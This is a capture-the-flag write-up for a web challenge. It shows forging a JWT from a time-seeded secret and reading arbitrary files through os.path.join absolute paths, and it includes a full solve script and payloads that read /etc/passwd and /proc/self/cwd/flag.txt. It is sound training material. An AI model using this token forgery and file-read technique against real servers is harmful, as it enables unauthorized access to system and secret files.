<h1>Random - Web</h1>

# Random (Web)

DESCRIPTION
I've only had the time to make the API, but it should be working properly. Please make sure it's secure. If you can read any file you want, I'll make sure to reward you!

## Solution
The challenge is a Flask server that uses `round(time.time())` as its seed. 
So if we can have that we can sign our own jwts. It also gives us a leak of when the server was started:
```python
except:
    abort(Response(f'<h1>NOT AUTHORIZED</h1><br><br><br><br><br> This system has been up for {round(time.time()-time_started)} seconds fyi :wink:', status=403))
```

Solution:
The solution relies on the fact that we can get the correct jwt and that `os.path.join()` has a peculiarity that
 if an absolute path is provided it directly just returns that path without joining anything.

We can get the time started by sending a jwt signed incorrectly such that we get the time the system has been up for.
We can substract that from the current time `print(round(time.time()))` and correcting for delays with the offset we can get the correct jwt and read files.
Then I just read the /etc/passwd to get the random directory name and then directly then read the flag using /dir/flag.txt.
But the intended approach is just to pass `'filename': '/proc/self/cwd/flag.txt'` which gives the flag without having to know the directory.

<h2>Solve.py:</h2>

```
import requests
import os
import time
import hashlib
import jwt
import os


def encode_user(secret):
    encoded_data = jwt.encode(payload={"userid": 0},
                              key=secret,
                              algorithm="HS256")
    return (encoded_data)

print(round(time.time()))
for offset in range(-3, -2, 1):
    time_started = 1715968499 - 30 + offset 
    APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()
    jwt_token = encode_user(APP_SECRET)
    print(jwt_token)
    # Define the headers with the JWT token
    headers = {}

    # Define the cookies
    cookies = {
        'session': jwt_token,
    }
    time_started = round(time.time())

    args = {
        
	#	'filename': '/etc/passwd'
        'filename': '/93db50a4598e8eb03fbdca154329e9b8/flag.txt'
    }

    response = requests.get(
        'https://random.chal.cyberjousting.com/api/file', headers=headers, cookies=cookies, params=args)
    print(response.text)
```